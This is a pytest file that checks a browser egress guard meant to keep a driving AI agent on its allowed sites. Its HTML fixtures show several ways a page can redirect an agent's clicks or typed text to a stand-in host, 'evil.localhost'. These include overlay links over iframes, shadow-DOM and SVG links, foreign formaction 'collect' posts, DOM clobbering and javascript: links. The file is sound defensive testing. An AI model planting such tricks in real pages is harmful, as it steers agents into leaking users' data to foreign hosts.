"""QA findings in the lane egress guard, on a real Camoufox browser (docs/design/egress-guard.md).

Why this file is in tests/node and not tests/unit: the bypasses live in the page's own JavaScript
(TARGET_JS in openajar.node.egress, and the hit test in openajar.node.human), so only a browser shows
them, and unit tests never start one. Run locally with:
    uv run pytest -m node tests/node/test_qa_egress_node.py -q
The browser gets no network: every proxy variable points at a closed loopback port (a Camoufox
fingerprint download would otherwise reach GitHub). Pages are served from 127.0.0.1 on the names
site.localhost (the lane's site) and evil.localhost (a foreign host); Firefox resolves *.localhost
to loopback itself.

Each finding's test asserts the guard refuses the action before it is sent (check_action raises
EgressRefused); they were strict xfails until the fixes. The controls and the popup check guard the
harness itself, and the tests after the findings pin what the fixes must still let through (on-site
targets, real clicks into frames) and a few more shapes of the same bypasses.
"""

from __future__ import annotations

import asyncio
import contextlib
import threading
from collections.abc import Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from types import SimpleNamespace

import pytest
import pytest_asyncio

from openajar.core.errors import EgressRefused
from openajar.core.models import ActionKind
from openajar.node import human
from openajar.node.egress import Driver, LaneGuard

camoufox = pytest.importorskip("camoufox.async_api")

pytestmark = pytest.mark.node

OFFLINE_PROXY = "http://127.0.0.1:9"  # nothing listens here: outbound fetches fail, none leave the host
SITE_LIST = ["site.localhost"]
AGENT = Driver(kind="agent", id="claude", grant_id="g1", lists=None, ceiling="draft")

SHADOW = ('<a id="a" href="EVIL/shadow"><x-card id="host"></x-card></a>'
          "<script>const r=document.getElementById('host').attachShadow({mode:'open'});"
          "r.innerHTML='<span id=\"inner\" style=\"display:inline-block;width:120px;height:40px\">Open</span>';"
          "</script>")
IFRAME = ('<iframe id="f" src="/frame" style="position:absolute;left:20px;top:20px;width:200px;height:60px;'
          'border:0"></iframe>'
          '<a id="ov" href="EVIL/iframe-overlay" style="position:absolute;left:0;top:0;width:400px;'
          'height:300px;z-index:9"></a>')
FRAME = '<button id="b" style="width:200px;height:60px;margin:0">Like</button>'
CARD = ('<div id="card" style="position:absolute;left:20px;top:20px;width:200px;height:60px">'
        '<a id="lk" href="EVIL/card" style="display:block;width:100%;height:100%">Read</a></div>')
SVG = ('<svg width="200" height="60"><a id="sv" href="EVIL/svg"><rect id="r" x="0" y="0" width="200" '
       'height="60" fill="red"></rect></a></svg>')
IMPLICIT = ('<form action="/safe" method="get"><input id="q" name="q">'
            '<button id="go" formaction="EVIL/collect" formmethod="post">Go</button></form>')
TYPENL = '<form action="EVIL/collect" method="post"><input id="q" name="q"></form>'
POPUP = ('<button id="pop" onclick="window.open(\'EVIL/popup\',\'_blank\',\'noopener\')">Pop</button>')
CONTROL_LINK = '<a id="lk" href="EVIL/direct">Direct</a>'
CONTROL_FORMACTION = ('<form action="/safe" method="get"><button id="go" formaction="EVIL/fa" '
                      'formmethod="post">Go</button></form>')


class _Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def _send(self, body: str):
        data = body.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        name = self.path.strip("/").split("?")[0]
        html = self.server.pages.get(name)  # type: ignore[attr-defined]
        self._send(html if html is not None else "<p>page</p>")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        self.rfile.read(length)
        self._send("ok")


@pytest.fixture(scope="module")
def site() -> Iterator[SimpleNamespace]:
    server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    server.pages = {}  # type: ignore[attr-defined]
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        yield SimpleNamespace(server=server, port=port, evil=f"http://evil.localhost:{port}",
                              own=f"http://site.localhost:{port}")
    finally:
        server.shutdown()
        server.server_close()


def serve(site: SimpleNamespace, name: str, html: str) -> str:
    """Put a page up under `name` and return its URL on the lane's site."""
    site.server.pages[name] = html.replace("EVIL", site.evil)  # type: ignore[attr-defined]
    return f"{site.own}/{name}"


@pytest_asyncio.fixture
async def browser() -> Iterator[object]:
    with pytest.MonkeyPatch.context() as mp:
        for var in ("HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "http_proxy", "https_proxy", "all_proxy"):
            mp.setenv(var, OFFLINE_PROXY)
        mp.setenv("NO_PROXY", "127.0.0.1,localhost,.localhost")
        async with camoufox.AsyncCamoufox(headless=True, humanize=False, i_know_what_im_doing=True,
                                          canvas_noise=False) as b:
            yield b


class _RefPage:
    """What check_action sees for `aria-ref=...`: a locator for the element the ref names."""

    def __init__(self, page, where):
        self._page = page
        self._where = where

    def locator(self, selector):
        return self._where(self._page)


async def refused(guard: LaneGuard, page, where, action: ActionKind | str, text: str | None) -> str | None:
    """The refusal check_action raises for this action, or None when it lets the action through."""
    try:
        await guard.check_action(_RefPage(page, where), "e1", action, text)
    except EgressRefused as e:
        return str(e)
    return None


async def open_lane(browser, url: str, sites: list[str] | None = None):
    ctx = await browser.new_context()
    page = await ctx.new_page()
    guard = LaneGuard("t/x", sites=SITE_LIST if sites is None else sites).attach(ctx)
    guard.drive(AGENT)
    await page.goto(url, wait_until="load")
    await asyncio.sleep(0.3)
    return ctx, page, guard


async def test_link_around_a_shadow_dom_target_is_refused(browser, site):
    ctx, page, guard = await open_lane(browser, serve(site, "shadow", SHADOW))
    try:
        reason = await refused(guard, page, lambda p: p.locator("#inner"), ActionKind.CLICK, None)
        assert reason is not None, "the click follows the outer link to a foreign host"
    finally:
        await ctx.close()


async def test_iframe_target_covered_by_a_parent_link_is_refused(browser, site):
    serve(site, "frame", FRAME)  # the frame's document must exist before the parent loads it
    ctx, page, guard = await open_lane(browser, serve(site, "iframe", IFRAME))
    try:
        reason = await refused(guard, page, lambda p: p.frame_locator("#f").locator("#b"), ActionKind.CLICK, None)
        assert reason is not None, "the click lands on the parent page's link to a foreign host"
    finally:
        await ctx.close()


async def test_click_on_a_container_with_a_descendant_link_is_refused(browser, site):
    ctx, page, guard = await open_lane(browser, serve(site, "card", CARD))
    try:
        reason = await refused(guard, page, lambda p: p.locator("#card"), ActionKind.CLICK, None)
        assert reason is not None, "the click reaches the nested link to a foreign host"
    finally:
        await ctx.close()


async def test_svg_link_is_refused(browser, site):
    ctx, page, guard = await open_lane(browser, serve(site, "svg", SVG))
    try:
        reason = await refused(guard, page, lambda p: p.locator("#r"), ActionKind.CLICK, None)
        assert reason is not None, "the click follows the SVG link to a foreign host"
    finally:
        await ctx.close()


async def test_enter_in_a_field_submitted_by_a_default_button_formaction_is_refused(browser, site):
    ctx, page, guard = await open_lane(browser, serve(site, "implicit", IMPLICIT))
    try:
        reason = await refused(guard, page, lambda p: p.locator("#q"), ActionKind.PRESS, "Enter")
        assert reason is not None, "Enter posts the field to the default button's foreign formaction"
    finally:
        await ctx.close()


async def test_typing_a_newline_into_a_form_field_is_refused(browser, site):
    ctx, page, guard = await open_lane(browser, serve(site, "typenl", TYPENL))
    try:
        reason = await refused(guard, page, lambda p: p.locator("#q"), ActionKind.TYPE, "x\n")
        assert reason is not None, "the newline submits the form to a foreign host"
    finally:
        await ctx.close()


# ---- controls: these pass today and keep the harness honest ----

async def test_control_direct_link_to_a_foreign_host_is_refused(browser, site):
    ctx, page, guard = await open_lane(browser, serve(site, "control_link", CONTROL_LINK))
    try:
        reason = await refused(guard, page, lambda p: p.locator("#lk"), ActionKind.CLICK, None)
        assert reason is not None and "not on this browser's site list" in reason
    finally:
        await ctx.close()


async def test_control_formaction_on_the_clicked_button_is_refused(browser, site):
    ctx, page, guard = await open_lane(browser, serve(site, "control_formaction", CONTROL_FORMACTION))
    try:
        reason = await refused(guard, page, lambda p: p.locator("#go"), ActionKind.CLICK, None)
        assert reason is not None and "not on this browser's site list" in reason
    finally:
        await ctx.close()


async def test_control_noopener_popup_to_a_foreign_host_is_closed(browser, site):
    # Measured: the request reaches the foreign host (the listener cannot stop it first), but the
    # popup is closed, as the design says. This pins that containment.
    ctx, page, _guard = await open_lane(browser, serve(site, "popup", POPUP))
    try:
        await page.locator("#pop").click()
        await asyncio.sleep(2.0)
        open_popups = [p for p in ctx.pages if p is not page and not p.is_closed()]
        assert open_popups == []
    finally:
        with contextlib.suppress(Exception):
            await ctx.close()


# ---- after the fixes: what must still go through, and more shapes of the same bypasses ----

ON_SITE = ('<div id="card" style="width:200px;height:60px"><a href="/post/1" style="display:block;height:100%">'
           'Read</a></div>'
           '<a href="/shadow"><x-card id="host"></x-card></a>'
           "<script>const r=document.getElementById('host').attachShadow({mode:'open'});"
           "r.innerHTML='<span id=\"inner\" style=\"display:inline-block;width:120px;height:40px\">Open</span>';"
           "</script>"
           '<svg width="200" height="60"><a href="/svg"><rect id="r" width="200" height="60"></rect></a></svg>'
           '<form action="/search" method="get"><input id="q" name="q"><button formaction="/search2">Go</button></form>'
           '<a id="mail" href="about:blank">blank</a>')
FRAMED = ('<iframe id="f" src="/inner" style="position:absolute;left:40px;top:70px;width:300px;height:160px;'
          'border:7px solid #888;padding:11px"></iframe>')
INNER = ('<body style="margin:0"><iframe id="g" src="/innermost" style="position:absolute;left:30px;top:20px;'
         'width:200px;height:90px;border:3px solid #444;padding:5px"></iframe></body>')
INNERMOST = ('<body style="margin:0"><button id="b" style="position:absolute;left:12px;top:9px;width:150px;'
             'height:50px" onclick="this.textContent=\'clicked\'">Like</button></body>')
CLOBBER = ('<form action="EVIL/collect" method="post"><input name="action" value="/safe">'
           '<input name="method" value="get"><button id="go">Go</button></form>')
LABEL = ('<form action="EVIL/collect" method="post"><button id="b">Go</button></form>'
         '<label id="l" for="b" style="display:inline-block;width:100px;height:30px">Go</label>')
IMAGE_MAP = ('<img id="m" usemap="#map" width="200" height="60" alt="">'
             '<map name="map"><area shape="rect" coords="0,0,200,60" href="EVIL/area" alt="a"></map>')
JS_LINK = '<a id="js" href="javascript:location.href=\'EVIL/js\'">Go</a>'
FORM_ATTR = ('<form id="far" action="EVIL/collect" method="post"></form>'
             '<form action="/safe"><input id="q" form="far" name="q"></form>')
SLOTTED = ('<x-wrap id="w"><span id="inner" style="display:inline-block;width:80px;height:30px">in</span></x-wrap>'
           "<script>const r=document.getElementById('w').attachShadow({mode:'open'});"
           "r.innerHTML='<a href=\"EVIL/slot\"><slot></slot></a>';</script>")


async def test_on_site_targets_are_not_refused(browser, site):
    ctx, page, guard = await open_lane(browser, serve(site, "onsite", ON_SITE))
    try:
        for where, action, text in ((lambda p: p.locator("#card"), ActionKind.CLICK, None),
                                    (lambda p: p.locator("#inner"), ActionKind.CLICK, None),
                                    (lambda p: p.locator("#r"), ActionKind.CLICK, None),
                                    (lambda p: p.locator("#q"), ActionKind.PRESS, "Enter"),
                                    (lambda p: p.locator("#q"), ActionKind.TYPE, "x\n"),
                                    (lambda p: p.locator("#mail"), ActionKind.CLICK, None)):
            assert await refused(guard, page, where, action, text) is None
        assert guard.blocks_since(0) == []
    finally:
        await ctx.close()


async def test_more_shapes_of_the_bypasses_are_refused(browser, site):
    """A control named action or method (DOM clobbering), a label for a submit button, an image map,
    a javascript: link, a field whose form attribute names another form, a link in a shadow tree
    around the slot a light child is shown in."""
    cases = (("clobber", CLOBBER, "#go", ActionKind.CLICK, None),
             ("label", LABEL, "#l", ActionKind.CLICK, None),
             ("imagemap", IMAGE_MAP, "#m", ActionKind.CLICK, None),
             ("jslink", JS_LINK, "#js", ActionKind.CLICK, None),
             ("formattr", FORM_ATTR, "#q", ActionKind.FILL, "x\r"),
             ("slotted", SLOTTED, "#inner", ActionKind.CLICK, None))
    for name, html, ref, action, text in cases:
        ctx, page, guard = await open_lane(browser, serve(site, name, html))
        try:
            reason = await refused(guard, page, lambda p, ref=ref: p.locator(ref), action, text)
            assert reason is not None, name
        finally:
            await ctx.close()


async def test_a_tab_before_a_newline_is_refused_and_a_lane_without_a_list_reads_nothing(browser, site):
    ctx, page, guard = await open_lane(browser, serve(site, "onsite2", ON_SITE))
    try:
        reason = await refused(guard, page, lambda p: p.locator("#q"), ActionKind.TYPE, "a\tb\n")
        assert reason is not None and "tab" in reason
    finally:
        await ctx.close()
    ctx, page, guard = await open_lane(browser, serve(site, "card2", CARD), sites=[])
    try:  # no site list and a grant with no egress list: behaves exactly as before
        assert await refused(guard, page, lambda p: p.locator("#card"), ActionKind.CLICK, None) is None
    finally:
        await ctx.close()


async def test_an_uncovered_target_in_nested_frames_is_let_through_and_clicked(browser, site):
    """The frame cover check and human.click map the point through borders and padding of two
    frame levels, one of them cross-origin, and the press lands on the button."""
    serve(site, "innermost", INNERMOST)
    site.server.pages["inner"] = INNER.replace("/innermost", f"http://a.site.localhost:{site.port}/innermost")
    ctx, page, guard = await open_lane(browser, serve(site, "framed", FRAMED), sites=["site.localhost",
                                                                                     "*.site.localhost"])
    try:
        await asyncio.sleep(0.5)
        button = page.frame_locator("#f").frame_locator("#g").locator("#b")
        assert await refused(guard, page, lambda p: button, ActionKind.CLICK, None) is None
        await human.click(page, button)
        assert await button.text_content() == "clicked"
    finally:
        await ctx.close()


async def test_human_click_refuses_a_frame_target_covered_in_the_parent(browser, site):
    serve(site, "frame", FRAME)
    ctx, page, _guard = await open_lane(browser, serve(site, "iframe2", IFRAME))
    try:
        with pytest.raises(human.TargetCovered):
            await human.click(page, page.frame_locator("#f").locator("#b"))
        assert not any("iframe-overlay" in p.url for p in ctx.pages)
    finally:
        await ctx.close()
